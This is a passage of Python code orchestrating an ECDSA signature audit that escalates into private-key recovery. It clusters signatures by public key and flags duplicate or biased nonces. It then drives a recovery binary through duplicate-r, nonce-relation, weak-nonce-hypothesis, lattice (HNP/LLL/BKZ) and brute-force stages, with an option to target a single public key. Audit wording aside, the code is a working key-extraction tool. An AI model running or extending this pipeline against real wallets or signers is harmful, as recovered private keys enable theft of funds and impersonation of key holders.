    temporal neighborhoods.
    """
    facts = load_recovery_graph_facts(recovered_json_path, recovered_k_path)
    recovered_pubs: set[str] = facts["recovered_pubs"]
    recovered_r: set[str] = facts["recovered_r"]

    groups: dict[str, list[tuple[int, str, dict[str, Any]]]] = defaultdict(list)
    total_rows = 0
    bad_json_rows = 0
    missing_pubkey_rows = 0
    if sig_path.exists():
        with sig_path.open("r", encoding="utf-8", errors="replace") as f:
            for idx, line in enumerate(f, start=1):
                raw = line.strip()
                if not raw:
                    continue
                total_rows += 1
                try:
                    obj = json.loads(raw)
                except Exception:
                    bad_json_rows += 1
                    continue
                if not isinstance(obj, dict):
                    bad_json_rows += 1
                    continue
                pub = normalize_pubkey_hex(str(obj.get("pubkey_hex") or obj.get("pub") or ""))
                if not pub:
                    missing_pubkey_rows += 1
                    continue
                groups[pub].append((idx, raw, obj))

    signer_stats = []
    for pub, rows in groups.items():
        if len(rows) < max(2, int(min_sigs)):
            continue
        r_counts: Counter[str] = Counter()
        recovered_r_hits = 0
        bad_r = 0
        for _, _, obj in rows:
            try:
                r_hex = format(parse_int(obj.get("r")), "064x")
                r_counts[r_hex] += 1
                if r_hex in recovered_r:
                    recovered_r_hits += 1
            except Exception:
                bad_r += 1
        dup_r_events = sum(c - 1 for c in r_counts.values() if c > 1)
        signer_stats.append(
            {
                "pub": pub,
                "rows": rows,
                "count": len(rows),
                "dup_r_events": dup_r_events,
                "dup_r_values": sum(1 for c in r_counts.values() if c > 1),
                "recovered_pubkey": pub in recovered_pubs,
                "recovered_r_hits": recovered_r_hits,
                "bad_r_rows": bad_r,
            }
        )

    signer_stats.sort(
        key=lambda x: (
            bool(x["recovered_pubkey"]),
            int(x["recovered_r_hits"]),
            int(x["dup_r_events"]),
            int(x["count"]),
        ),
        reverse=True,
    )
    if max_signers > 0:
        signer_stats = signer_stats[:max_signers]

    selected_raw: dict[tuple[str, str, int], str] = {}
    top_report = []
    rows_per_signer = max(2, int(max_rows_per_signer))
    window = max(1, int(neighbor_window))
    for stat in signer_stats:
        pub = stat["pub"]
        ordered = sorted(
            stat["rows"],
            key=lambda item: _signature_order_key(item[2], item[0]),
        )
        if len(ordered) > rows_per_signer:
            # Preserve the newest rows and a deterministic prefix sample. This
            # keeps old anomalies reachable while bounding per-signer cost.
            head_n = max(0, min(len(ordered), rows_per_signer // 4))
            tail_n = rows_per_signer - head_n
            ordered = ordered[:head_n] + ordered[-tail_n:]

        signer_selected = 0
        for pos, (_, raw, obj) in enumerate(ordered):
            try:
                vin = parse_int(obj.get("vin") if obj.get("vin") is not None else obj.get("input_index") or 0)
            except Exception:
                vin = 0
            txid = str(obj.get("txid") or "")
            key = (pub, txid, vin)
            selected_raw[key] = raw
            signer_selected += 1
            # Ensure local temporal neighbors are retained even after the head/tail cap.
            for off in range(1, window + 1):
                for np in (pos - off, pos + off):
                    if 0 <= np < len(ordered):
                        _, nraw, nobj = ordered[np]
                        try:
                            nvin = parse_int(
                                nobj.get("vin") if nobj.get("vin") is not None else nobj.get("input_index") or 0
                            )
                        except Exception:
                            nvin = 0
                        selected_raw[(pub, str(nobj.get("txid") or ""), nvin)] = nraw

        top_report.append(
            {
                "pubkey_prefix": pub[:20],
                "source_rows": stat["count"],
                "selected_rows": signer_selected,
                "dup_r_values": stat["dup_r_values"],
                "dup_r_events": stat["dup_r_events"],
                "recovered_pubkey": stat["recovered_pubkey"],
                "recovered_r_hits": stat["recovered_r_hits"],
            }
        )

    out_path.parent.mkdir(parents=True, exist_ok=True)
    with out_path.open("w", encoding="utf-8") as out:
        for raw in selected_raw.values():
            out.write(raw + "\n")

    payload = {
        "source_sigs": str(sig_path),
        "output": str(out_path),
        "total_rows": total_rows,
        "bad_json_rows": bad_json_rows,
        "missing_pubkey_rows": missing_pubkey_rows,
        "signer_groups_total": len(groups),
        "eligible_signers": len([s for s in signer_stats if int(s["count"]) >= max(2, int(min_sigs))]),
        "selected_signers": len(signer_stats),
        "selected_rows": len(selected_raw),
        "policy": {
            "min_sigs": int(min_sigs),
            "max_signers": int(max_signers),
            "max_rows_per_signer": int(max_rows_per_signer),
            "neighbor_window": int(neighbor_window),
            "ranking": "recovered_pubkey+recovered_r+dup_r+count",
        },
        "top_signers": top_report[:100],
        "secret_material": "LOCAL_ARTIFACT_ONLY",
    }
    report_path.parent.mkdir(parents=True, exist_ok=True)
    report_path.write_text(json.dumps(payload, indent=2), encoding="utf-8")
    return payload


def cluster_key(obj: dict[str, Any]) -> str:
    pub = (obj.get("pubkey_hex") or obj.get("pub") or "").strip().lower()
    if pub:
        return f"pub:{pub}"
    prev_spk = (obj.get("prev_spk") or "").strip().lower()
    if prev_spk:
        return f"spk:{prev_spk}"
    wscript = (obj.get("witness_script") or "").strip().lower()
    if wscript:
        return f"wsh:{wscript[:40]}"
    return "unknown"


def chi_square_uniform(counts: list[int], expected: float) -> float:
    if expected <= 0:
        return 0.0
    return sum(((c - expected) ** 2) / expected for c in counts)


def compute_cluster_stats(records: list[dict[str, Any]]) -> dict[str, Any]:
    r_vals = []
    for rec in records:
        try:
            r_vals.append(parse_int(rec["r"]))
        except Exception:
            continue

    n = len(r_vals)
    if n == 0:
        return {
            "count": 0,
            "dup_r_values": 0,
            "dup_r_events": 0,
            "tiny_r_lt_2^240": 0,
            "tiny_r_ratio": 0.0,
            "mod16_chi2": 0.0,
            "cluster_risk_score": 0,
        }

    r_counts = Counter(r_vals)
    dup_r_values = sum(1 for c in r_counts.values() if c > 1)
    dup_r_events = sum(c - 1 for c in r_counts.values() if c > 1)

    tiny_r = sum(1 for r in r_vals if r < 2**240)
    tiny_ratio = tiny_r / n

    mod16 = [0] * 16
    for r in r_vals:
        mod16[r % 16] += 1
    mod16_chi2 = chi_square_uniform(mod16, n / 16)

    score = 0
    reasons = []
    if dup_r_values > 0:
        score += 100 + min(100, dup_r_events * 5)
        reasons.append("duplicate_r")
    if tiny_ratio > 0.01:
        score += 20
        reasons.append("tiny_r_ratio")
    if mod16_chi2 > 35.0:
        score += 15
        reasons.append("mod16_bias")

    return {
        "count": n,
        "dup_r_values": dup_r_values,
        "dup_r_events": dup_r_events,
        "tiny_r_lt_2^240": tiny_r,
        "tiny_r_ratio": tiny_ratio,
        "mod16_chi2": mod16_chi2,
        "cluster_risk_score": score,
        "reasons": reasons,
    }


def verification_quality(report: dict[str, Any]) -> dict[str, Any]:
    vg = report.get("verification_gate", {}) or {}
    enabled = bool(vg.get("enabled", False))
    coincurve_available = bool(vg.get("coincurve_available", False))
    verifiable = int(vg.get("verifiable", 0) or 0)
    invalid = int(vg.get("invalid", 0) or 0)
    valid = int(vg.get("valid", 0) or 0)
    dropped = int(vg.get("dropped", 0) or 0)
    invalid_ratio = (invalid / verifiable) if verifiable > 0 else 0.0
    return {
        "enabled": enabled,
        "coincurve_available": coincurve_available,
        "verifiable": verifiable,
        "valid": valid,
        "invalid": invalid,
        "dropped": dropped,
        "invalid_ratio": invalid_ratio,
        "reason_counts": vg.get("reason_counts", {}) or {},
    }


def build_cluster_subset(
    sig_path: Path,
    min_sigs: int,
    cluster_risk_threshold: int,
    max_clusters: int,
    out_path: Path,
    report_path: Path,
    audit_report: dict[str, Any] | None = None,
) -> dict[str, Any]:
    grouped: dict[str, list[tuple[str, dict[str, Any]]]] = defaultdict(list)

    with sig_path.open("r", encoding="utf-8") as f:
        for line_no, line in enumerate(f, start=1):
            raw = line.strip()
            if not raw:
                continue
            try:
                obj = json.loads(raw)
            except json.JSONDecodeError:
                continue
            if not isinstance(obj, dict):
                continue
            grouped[cluster_key(obj)].append((raw, obj))

    cluster_fdr_map: dict[str, int] = {}
    if audit_report:
        for c in ((audit_report.get("clusters", {}) or {}).get("top_clusters", []) or []):
            key = c.get("cluster")
            if isinstance(key, str):
                cluster_fdr_map[key] = int(c.get("fdr_bits_r", 0) or 0)
    global_drift_flags = int(((audit_report or {}).get("height_time_drift", {}) or {}).get("drift_flags", 0) or 0)
    signer_drift_flagged = int(
        ((audit_report or {}).get("signer_longitudinal_drift", {}) or {}).get("signer_count_flagged", 0) or 0
    )

    cluster_rows = []
    for key, rows in grouped.items():
        if len(rows) < min_sigs:
            continue
        stats = compute_cluster_stats([obj for _, obj in rows])
        # Cluster scoring v2: combine local signal with audit context (FDR/drift).
        fdr_bits = int(cluster_fdr_map.get(key, 0))
        drift_weight = 0
        if global_drift_flags > 0:
            drift_weight += 8
        if signer_drift_flagged > 0:
            drift_weight += 6
        context_score = min(40, fdr_bits * 6) + drift_weight
        stats["fdr_bits_r"] = fdr_bits
        stats["context_drift_weight"] = drift_weight
        stats["cluster_risk_score_v2"] = int(stats["cluster_risk_score"]) + context_score
        cluster_rows.append({"cluster": key, **stats})

    cluster_rows.sort(key=lambda x: (x["cluster_risk_score_v2"], x["dup_r_events"], x["count"]), reverse=True)

    flagged = [
        r
        for r in cluster_rows
        if r["cluster_risk_score_v2"] >= cluster_risk_threshold or r["dup_r_values"] > 0
    ]
    flagged = flagged[:max_clusters]
    flagged_keys = {r["cluster"] for r in flagged}

    selected_lines = 0
    with out_path.open("w", encoding="utf-8") as out:
        for key, rows in grouped.items():
            if key not in flagged_keys:
                continue
            for raw, _ in rows:
                out.write(raw + "\n")
                selected_lines += 1

    report = {
        "input_file": str(sig_path),
        "total_clusters": len(grouped),
        "analyzed_clusters": len(cluster_rows),
        "flagged_clusters": len(flagged),
        "selected_signatures": selected_lines,
        "policy": {
            "min_sigs": min_sigs,
            "cluster_risk_threshold": cluster_risk_threshold,
            "max_clusters": max_clusters,
            "scoring": "v2(base+fdr+drift)",
        },
        "top_clusters": flagged,
    }

    with report_path.open("w", encoding="utf-8") as f:
        json.dump(report, f, indent=2)

    return report


def main() -> None:
    ap = argparse.ArgumentParser(description="Automate audit + recovery orchestration")
    ap.add_argument("--sigs", default="signatures.jsonl", help="Input signatures JSONL")
    ap.add_argument("--audit-report", default="ecdsa_audit_report.json", help="Audit report output")
    ap.add_argument("--decision-out", default="automate_decision.json", help="Automation decision summary JSON output")
    ap.add_argument("--baseline-report", default="ecdsa_audit_report_prev.json",
                    help="Previous audit report JSON path used for automatic delta comparison")
    ap.add_argument("--audit-verify-signatures", action="store_true", default=True,
                    help="Enable signature verification gate during audit (default: enabled)")
    ap.add_argument("--no-audit-verify-signatures", action="store_false", dest="audit_verify_signatures",
                    help="Disable signature verification gate during audit")
    ap.add_argument("--audit-cluster-min-size", type=int, default=25,
                    help="Minimum cluster size for audit per-cluster analysis")
    ap.add_argument("--recover-bin", default="./ecdsa_recover_strict", help="Recover binary path")
    ap.add_argument("--threads", type=int, default=8)
    ap.add_argument("--max-iter", type=int, default=2)
    ap.add_argument("--risk-threshold", type=int, default=40,
                    help="Run advanced recover only if global risk.score >= threshold")
    ap.add_argument("--force-recover", action="store_true", help="Run recover regardless of risk score")
    ap.add_argument("--exhaustive-recover", action="store_true",
                    help="Do not stop at selective/cheap paths; run all enabled recovery stages and full-input fallback")
    ap.add_argument("--dry-run", action="store_true")
    ap.add_argument("--stage0-only", action="store_true",
                    help="Run only the direct duplicate-r Stage0 recovery when nontrivial duplicate-r exists")
    ap.add_argument("--stop-after-stage0-hit", action="store_true",
                    help="Stop after Stage0 direct duplicate-r recovery if it produced new valid local rows")

    ap.add_argument("--cluster-min-sigs", type=int, default=25,
                    help="Minimum signatures required in a cluster to evaluate risk")
    ap.add_argument("--cluster-risk-threshold", type=int, default=20,
                    help="Cluster score threshold for inclusion in recover subset")
    ap.add_argument("--max-clusters", type=int, default=50,
                    help="Maximum suspicious clusters to include")
    ap.add_argument("--clustered-sigs-out", default="signatures.clustered.jsonl",
                    help="Filtered signature file for recover")
    ap.add_argument("--cluster-report", default="cluster_risk_report.json",
                    help="Cluster risk report JSON")
    ap.add_argument("--recover-json-out", default="recovered_keys.jsonl",
                    help="Recovery output JSONL path")
    ap.add_argument("--recover-txt-out", default="recovered_keys.txt",
                    help="Recovery output TXT path")
    ap.add_argument("--recover-k-out", default="recovered_k.jsonl",
                    help="Recovered k output JSONL path")
    ap.add_argument("--recover-deltas-out", default="delta_insights.jsonl",
                    help="Delta insights JSONL path")
    ap.add_argument("--recover-collisions-out", default="r_collisions.jsonl",
                    help="Collision report JSONL path")
    ap.add_argument("--recover-clusters-out", default="dupR_clusters.jsonl",
                    help="Exported duplicate-R cluster JSONL path")
    ap.add_argument("--hnp-candidates-out", default="hnp_lll_bkz_candidates.txt",
                    help="HNP solver candidate output path")
    ap.add_argument("--hnp-leaks-out", default="signatures.hnp_leaks.jsonl",
                    help="Standardized explicit nonce-leak JSONL passed to the HNP solver")
    ap.add_argument("--hnp-leak-report", default="hnp_leak_report.json",
                    help="Metadata-only report for explicit HNP leak extraction")
    ap.add_argument("--hnp-bounded-k-out", default="hnp_bounded_k_candidates.jsonl",
                    help="Local r->k candidates generated when explicit nonce leakage leaves a bounded search space")
    ap.add_argument("--hnp-bounded-k-report", default="hnp_bounded_k_report.json",
                    help="Metadata-only report for bounded explicit-leak k generation")
    ap.add_argument("--preload-k-candidates", default="",
                    help="Local JSONL file with r plus 64-hex k candidates; passed to ecdsa_recover_strict --preload-k")
    ap.add_argument("--preload-priv-candidates", default="",
                    help="Local WIF/hex/decimal private-key candidate file; passed to ecdsa_recover_strict --preload-priv")
    ap.add_argument("--preload-recovered-json", default="",
                    help="Local recovered_keys.jsonl used to seed/deduplicate recovery graph without printing secrets")
    ap.add_argument("--candidate-validation-report", default="candidate_validation_report.json",
                    help="Local metadata-only report for external candidate validation")
    ap.add_argument("--enable-nonce-hypotheses", action="store_true",
                    help="Generate bounded weak-nonce r->k candidates and validate them locally")
    ap.add_argument("--nonce-hypothesis-models",
                    default=(
                        "timestamp-direct,timestamp-sha256,height-direct,height-sha256,"
                        "txid-sha256,txid-vin-sha256,txid-vin-sighash-sha256"
                    ),
                    help="Comma-separated candidate_hypotheses.py models")
    ap.add_argument("--nonce-hypothesis-out", default="nonce_hypothesis_k.jsonl",
                    help="Generated r->k candidate JSONL path")
    ap.add_argument("--nonce-hypothesis-report", default="nonce_hypothesis_report.json",
                    help="Generated nonce hypothesis report JSON path")
    ap.add_argument("--nonce-time-window-sec", type=int, default=0,
                    help="Timestamp hypothesis +/- window in seconds")
    ap.add_argument("--nonce-time-step-sec", type=int, default=1,
                    help="Timestamp hypothesis step in seconds")
    ap.add_argument("--nonce-counter-max", type=int, default=0,
                    help="Counter upper bound for timestamp/height counter hash models")
    ap.add_argument("--nonce-small-k-start", type=int, default=1,
                    help="Small-k model inclusive start")
    ap.add_argument("--nonce-small-k-end", type=int, default=0,
                    help="Small-k model inclusive end; 0 disables small-k unless set")
    ap.add_argument("--nonce-max-candidates", type=int, default=200000,
                    help="Maximum nonce hypothesis candidates to test before stopping")
    ap.add_argument("--combined-preload-k-out", default="combined_preload_k.jsonl",
                    help="Merged preload-k path when external and generated k candidates both exist")
    ap.add_argument("--target-pubkey", default="",
                    help="Optional compressed/uncompressed SEC pubkey hex; audit/recover only signatures for this pubkey")
    ap.add_argument("--target-sigs-out", default="signatures.target.jsonl",
                    help="Output JSONL path for --target-pubkey filtered signatures")
    ap.add_argument("--stage0-subset-out", default="signatures.dup_r_focus.jsonl",
                    help="Path for the duplicate-r focus subset")
    ap.add_argument("--stage0-recoverable-out", default="signatures.dup_r_recoverable.jsonl",
                    help="Path for nontrivial/cross-pub duplicate-r rows used by direct Stage0 recovery")
    ap.add_argument("--stage0-replay-out", default="signatures.dup_r_replay.jsonl",
                    help="Path for replay-like duplicate-r rows kept for evidence but skipped by Stage0 recovery")
    ap.add_argument("--stage0-classification-report", default="duplicate_r_classification_report.json",
                    help="Metadata-only duplicate-r classification report")
    ap.add_argument("--duplicate-r-pair-report", default="duplicate_r_pair_diagnostics.json",
                    help="Metadata-only per-pair duplicate-r correctness and blocker diagnostics")
    ap.add_argument("--strong-signal-out", default="signatures.strong_signal.jsonl",
                    help="Path for the strongest-signal subset used by random-k stage")
    ap.add_argument("--relation-neighborhood-out", default="signatures.relation_neighborhood.jsonl",
                    help="Path for signer-local rows used by structured delta/affine relation recovery")
    ap.add_argument("--relation-neighborhood-report", default="relation_neighborhood_report.json",
                    help="Metadata-only report for signer-local relation recovery subset")
    ap.add_argument("--relation-min-sigs", type=int, default=8,
                    help="Minimum signatures per signer for relation-neighborhood selection")
    ap.add_argument("--relation-max-signers", type=int, default=200,
                    help="Maximum signers selected for relation-neighborhood scans; 0 means no cap")
    ap.add_argument("--relation-max-rows-per-signer", type=int, default=512,
                    help="Maximum rows retained per signer before neighbor expansion")
    ap.add_argument("--relation-neighbor-window", type=int, default=2,
                    help="Adjacent sorted rows retained around selected signer rows")
    ap.add_argument("--enable-chain-extraction", action="store_true", default=True,
                    help="After recovered keys exist, rescan full input with cheap propagation to extract more local k/d chains")
    ap.add_argument("--no-enable-chain-extraction", action="store_false", dest="enable_chain_extraction",
                    help="Disable full-input propagation from already recovered local keys")
    ap.add_argument("--chain-max-iter", type=int, default=2,
                    help="max-iter for the cheap recovered-key chain extraction stage")
    ap.add_argument("--recovery-chain-report", default="recovery_chain_report.json",
                    help="Metadata-only report describing local recovered-key chain coverage")
    ap.add_argument("--recovery-graph-subset-out", default="signatures.recovery_graph_focus.jsonl",
                    help="Rows connected to recovered pubkeys or recovered r->k facts for cheap chain extraction")
    ap.add_argument("--recovery-graph-report", default="recovery_graph_report.json",
                    help="Metadata-only report for recovered fact graph focus selection")
    ap.add_argument("--recovery-graph-expansion-report", default="recovery_graph_expansion_report.json",
                    help="Metadata-only report explaining whether graph-connected rows expanded recovery")
    ap.add_argument("--disable-cluster-gating", action="store_true",
                    help="Recover on full signature file (legacy behavior)")
    ap.add_argument("--enable-advanced-recover", action="store_true", default=True,
                    help="Enable multi-stage advanced recovery escalation (default: enabled)")
    ap.add_argument("--no-enable-advanced-recover", action="store_false", dest="enable_advanced_recover",
                    help="Disable advanced recovery escalation")
    ap.add_argument("--random-k-budget", type=int, default=0,
                    help="Random-k tries per bucket for final escalation stage (0 disables random-k stage)")
    ap.add_argument("--delta-max", type=int, default=4096,
                    help="Maximum absolute delta tested for k2 = k1 +/- delta relation")
    ap.add_argument("--delta-per-pair-cap", type=int, default=4096,
                    help="Per-pair cap for delta-gradient relation testing")
    ap.add_argument("--lcg-a-max", type=int, default=4,
                    help="Affine nonce recurrence bound: test |a-1| <= this value")
    ap.add_argument("--lcg-b-max", type=int, default=4096,
                    help="Affine nonce recurrence bound: test |b| <= this value")
    ap.add_argument("--lcg-per-pair-cap", type=int, default=2048,
                    help="Per-pair cap for affine-LCG relation testing")
    ap.add_argument("--hnp-timeout-sec", type=int, default=120,
                    help="Timeout in seconds for HNP/LLL/BKZ solver subprocess")
    ap.add_argument("--hnp-min-leaks", type=int, default=8,
                    help="Minimum rows with explicit known_nonce_bits required to run HNP solver")
    ap.add_argument("--hnp-bits-known", type=int, default=6,
                    help="Known nonce bits used for explicit HNP leak rows")
    ap.add_argument("--hnp-leakage-model", choices=("LSB",), default="LSB",
                    help="Explicit nonce leakage model for HNP rows; only LSB is currently validation-safe")
    ap.add_argument("--hnp-bruteforce-unknown-bits", type=int, default=18,
                    help="Generate exact k candidates only if explicit leak leaves <= this many unknown bits")
    ap.add_argument("--hnp-bruteforce-max-candidates", type=int, default=200000,
                    help="Global cap for exact explicit-leak k candidates")
    ap.add_argument("--hnp-report-out", default="hnp_lll_bkz_report.json",
                    help="Metadata-only HNP gating/solver diagnostics report")
    ap.add_argument("--max-invalid-ratio", type=float, default=0.35,
                    help="If verification invalid_ratio exceeds this (and enough verifiable rows), treat dataset as low-quality")
    ap.add_argument("--min-verifiable-for-gate", type=int, default=200,
                    help="Minimum verifiable signatures before invalid-ratio quality gate is enforced")
    ap.add_argument("--fusion-min-confidence", type=float, default=0.45,
                    help="Minimum signal_fusion confidence to allow recovery without hard signal")
    ap.add_argument("--full-scan-fallback", action="store_true", default=True,
                    help="If filtered recovery yields no new valid rows, automatically retry on the full signature file")
    ap.add_argument("--no-full-scan-fallback", action="store_false", dest="full_scan_fallback",
                    help="Disable automatic retry on the full signature file")
    ap.add_argument("--fallback-max-iter", type=int, default=3,
                    help="max-iter used by the automatic full-input fallback pass")
    ap.add_argument("--fallback-random-k-budget", type=int, default=4096,
                    help="Random-k budget for the automatic full-input fallback pass")
    ap.add_argument("--auto-tune", action="store_true", default=True,
                    help="Auto-tune resource-sensitive parameters from machine CPU/RAM (default: enabled)")
    ap.add_argument("--no-auto-tune", action="store_false", dest="auto_tune",
                    help="Disable machine-aware auto-tuning")

    args = ap.parse_args()

    sigs = Path(args.sigs)
    if not sigs.exists():
        raise FileNotFoundError(f"Missing signatures file: {sigs}")
    for out_path in (
        args.audit_report,
        args.decision_out,
        args.clustered_sigs_out,
        args.cluster_report,
        args.recover_json_out,
        args.recover_txt_out,
        args.recover_k_out,
        args.recover_deltas_out,
        args.recover_collisions_out,
        args.recover_clusters_out,
        args.hnp_candidates_out,
        args.hnp_report_out,
        args.candidate_validation_report,
        args.nonce_hypothesis_out,
        args.nonce_hypothesis_report,
        args.combined_preload_k_out,
        args.target_sigs_out,
        args.stage0_subset_out,
        args.stage0_recoverable_out,
        args.stage0_replay_out,
        args.stage0_classification_report,
        args.duplicate_r_pair_report,
        args.strong_signal_out,
        args.baseline_report,
    ):
        Path(out_path).parent.mkdir(parents=True, exist_ok=True)

    target_filter_info: dict[str, Any] = {"enabled": False}
    original_sigs = sigs
    if args.target_pubkey:
        target_filter_info = build_target_pubkey_subset(sigs, args.target_pubkey, Path(args.target_sigs_out))
        sigs = Path(args.target_sigs_out)
        print(
            "Target pubkey filter:",
            f"matched={target_filter_info.get('matched_rows', 0)}",
            f"unique_tx_inputs={target_filter_info.get('unique_tx_inputs', 0)}",
            f"output={sigs}",
        )

    sig_rows = count_nonempty_lines(sigs)
    if sig_rows == 0:
        print("No signatures available yet; skipping audit/recover for this cycle.")
        write_decision(args.decision_out, {
            "should_recover": False,
            "recover_executed": False,
            "search_attempted": False,
            "target_filter": target_filter_info,
            "source_sigs": str(original_sigs),
            "recover_input": None,
        })
        return

    if args.auto_tune:
        auto_tune_params(args, sys.argv[1:], sig_rows)

    py_exec = resolve_python_executable()
    print(f"[python] using interpreter: {py_exec}")

    audit_cmd = [
        py_exec,
        "ecdsa_signature_audit.py",
        str(sigs),
        "--out",
        args.audit_report,
        "--cluster-min-size",
        str(args.audit_cluster_min_size),
        "--baseline-report",
        args.baseline_report,
    ]
    if args.audit_verify_signatures:
        audit_cmd.append("--verify-signatures")
    if args.dry_run:
        print("DRY RUN:", " ".join(shlex.quote(x) for x in audit_cmd))
        return

    if run_cmd(audit_cmd) != 0:
        raise RuntimeError("Audit step failed")

    with open(args.audit_report, "r", encoding="utf-8") as f:
        report = json.load(f)

    risk = int(report.get("risk", {}).get("score", 0))
    verdict = report.get("risk", {}).get("verdict", "unknown")
    dup_r = int(report.get("duplicates_r", {}).get("duplicate_count", 0))
    cross_pub_dup_r = int(report.get("cross_pub_duplicate_r", {}).get("collision_count", 0))
    drift_flags = int(report.get("height_time_drift", {}).get("drift_flags", 0))
    signer_drift_flagged = int(report.get("signer_longitudinal_drift", {}).get("signer_count_flagged", 0))
    sighash_segments = report.get("sighash_segments", {}).get("segments", [])
    sighash_anomaly = any((int(s.get("duplicate_r", 0)) > 0 or int(s.get("fdr_bits_r", 0)) > 0) for s in sighash_segments)
    fusion = report.get("signal_fusion", {}) or {}
    fusion_conf = float(fusion.get("confidence", 0.0) or 0.0)
    fusion_tier = str(fusion.get("tier", "low") or "low")
    fusion_reco = str(fusion.get("recommendation", "monitor_only") or "monitor_only")
    vq = verification_quality(report)
    known_nonce_rows_all = count_known_nonce_rows(sigs)
    external_candidate_requested = bool(
        args.preload_k_candidates
        or args.preload_priv_candidates
        or args.enable_nonce_hypotheses
        or known_nonce_rows_all >= int(args.hnp_min_leaks)
    )
    low_quality_data = (
        vq["enabled"]
        and vq["coincurve_available"]
        and vq["verifiable"] >= args.min_verifiable_for_gate
        and int(vq.get("dropped", 0) or 0) > 0
        and vq["invalid_ratio"] > args.max_invalid_ratio
    )

    print(f"Audit risk score: {risk} ({verdict})")
    print(f"Duplicate-r groups: {dup_r}")
    print(f"Cross-pub duplicate-r groups: {cross_pub_dup_r}")
    print(f"Height/time drift flags: {drift_flags}")
    print(f"Signal fusion: tier={fusion_tier} conf={fusion_conf:.3f} recommendation={fusion_reco}")
    print(
        "Verification quality:",
        f"verifiable={vq['verifiable']}",
        f"invalid={vq['invalid']}",
        f"invalid_ratio={vq['invalid_ratio']:.4f}",
    )

    should_recover = (
        args.force_recover
        or args.exhaustive_recover
        or external_candidate_requested
        or risk >= args.risk_threshold
        or fusion_conf >= args.fusion_min_confidence
        or dup_r > 0
        or cross_pub_dup_r > 0
        or drift_flags > 0
        or sighash_anomaly
    )
    hard_signal = (
        dup_r > 0
        or cross_pub_dup_r > 0
        or drift_flags > 0
        or signer_drift_flagged > 0
        or sighash_anomaly
    )
    if low_quality_data and not (hard_signal or args.force_recover or args.exhaustive_recover or external_candidate_requested):
        should_recover = False

    cluster_fallback_used = False

    if not should_recover:
        print("Recovery skipped by policy (low anomaly signal).")
        write_decision(args.decision_out, {
            "should_recover": False,
            "recover_executed": False,
            "risk_score": risk,
            "risk_verdict": verdict,
            "duplicate_r": dup_r,
            "cross_pub_duplicate_r": cross_pub_dup_r,
            "drift_flags": drift_flags,
            "sighash_anomaly": sighash_anomaly,
            "signal_fusion_tier": fusion_tier,
            "signal_fusion_confidence": fusion_conf,
            "signal_fusion_recommendation": fusion_reco,
            "verification_quality": vq,
            "low_quality_data": low_quality_data,
            "cluster_fallback_used": cluster_fallback_used,
            "target_filter": target_filter_info,
            "source_sigs": str(original_sigs),
            "recover_input": None,
            "cluster_gating_used": not args.disable_cluster_gating,
        })
        try:
            Path(args.baseline_report).write_text(Path(args.audit_report).read_text(encoding="utf-8"), encoding="utf-8")
        except Exception:
            pass
        return

    recover_input = str(sigs)
    allow_advanced = args.enable_advanced_recover
    if fusion_reco == "monitor_only" and not (
        hard_signal or args.force_recover or args.exhaustive_recover or external_candidate_requested
    ):
        print("Fusion recommendation is monitor_only; recovery skipped.")
        write_decision(args.decision_out, {
            "should_recover": False,
            "recover_executed": False,
            "risk_score": risk,
            "risk_verdict": verdict,
            "duplicate_r": dup_r,
            "cross_pub_duplicate_r": cross_pub_dup_r,
            "drift_flags": drift_flags,
            "sighash_anomaly": sighash_anomaly,
            "signal_fusion_tier": fusion_tier,
            "signal_fusion_confidence": fusion_conf,
            "signal_fusion_recommendation": fusion_reco,
            "verification_quality": vq,
            "low_quality_data": low_quality_data,
            "cluster_fallback_used": cluster_fallback_used,
            "target_filter": target_filter_info,
            "source_sigs": str(original_sigs),
            "recover_input": None,
            "cluster_gating_used": not args.disable_cluster_gating,
        })
        return
    if fusion_reco == "run_clustered_recovery" and not args.exhaustive_recover:
        allow_advanced = False

    effective_cluster_threshold = args.cluster_risk_threshold
    if low_quality_data:
        # Defensive: require stronger per-cluster signal when verification quality is poor.
        effective_cluster_threshold += 15
    if fusion_tier == "high":
        effective_cluster_threshold = max(5, effective_cluster_threshold - 5)
    elif fusion_tier == "critical":
        effective_cluster_threshold = max(0, effective_cluster_threshold - 10)
    # Stage0 is built from the full input before any cluster filtering.
    stage0_subset_info = None
    duplicate_r_pair_report: dict[str, Any] = {}
    duplicate_r_pair_summary: dict[str, Any] = {}
    stage0_path = Path(args.stage0_subset_out)
    stage0_recoverable_path = Path(args.stage0_recoverable_out)
    stage0_replay_path = Path(args.stage0_replay_out)
    if dup_r > 0:
        stage0_subset_info = build_duplicate_r_focus_subset(
            sig_path=sigs,
            out_path=stage0_path,
            recoverable_out_path=stage0_recoverable_path,
            replay_out_path=stage0_replay_path,
            report_path=Path(args.stage0_classification_report),
        )

    if not args.disable_cluster_gating:
        cluster_report = build_cluster_subset(
            sig_path=sigs,
            min_sigs=args.cluster_min_sigs,
            cluster_risk_threshold=effective_cluster_threshold,
            max_clusters=args.max_clusters,
            out_path=Path(args.clustered_sigs_out),
            report_path=Path(args.cluster_report),
            audit_report=report,
        )
        print(
            "Cluster gating:",
            f"analyzed={cluster_report['analyzed_clusters']}",
            f"flagged={cluster_report['flagged_clusters']}",
            f"selected_signatures={cluster_report['selected_signatures']}",
        )
        if cluster_report["selected_signatures"] == 0 and not args.force_recover:
            strong_no_cluster_signal = (
                args.exhaustive_recover
                or fusion_tier in {"high", "critical"}
                or risk >= args.risk_threshold + 20
                or dup_r > 0
                or cross_pub_dup_r > 0
                or drift_flags > 0
                or sighash_anomaly
                or external_candidate_requested
            )
            if strong_no_cluster_signal:
                cluster_fallback_used = True
                recover_input = str(sigs)
                print("No suspicious clusters selected, but strong signal is present; falling back to full-input recovery.")
            else:
                print("No suspicious clusters selected; recovery skipped.")
                write_decision(args.decision_out, {
                    "should_recover": True,
                    "recover_executed": False,
                    "risk_score": risk,
                    "risk_verdict": verdict,
                    "duplicate_r": dup_r,
                    "cross_pub_duplicate_r": cross_pub_dup_r,
                    "drift_flags": drift_flags,
                    "sighash_anomaly": sighash_anomaly,
                    "signal_fusion_tier": fusion_tier,
                    "signal_fusion_confidence": fusion_conf,
                    "signal_fusion_recommendation": fusion_reco,
                    "verification_quality": vq,
                    "low_quality_data": low_quality_data,
                    "cluster_fallback_used": cluster_fallback_used,
                    "target_filter": target_filter_info,
                    "source_sigs": str(original_sigs),
                    "recover_input": None,
                    "cluster_gating_used": not args.disable_cluster_gating,
                    "effective_cluster_risk_threshold": effective_cluster_threshold,
                    "cluster_report": cluster_report,
                    "duplicate_r_pair_diagnostics": duplicate_r_pair_summary,
                })
                return
        if cluster_report["selected_signatures"] > 0:
            recover_input = args.clustered_sigs_out

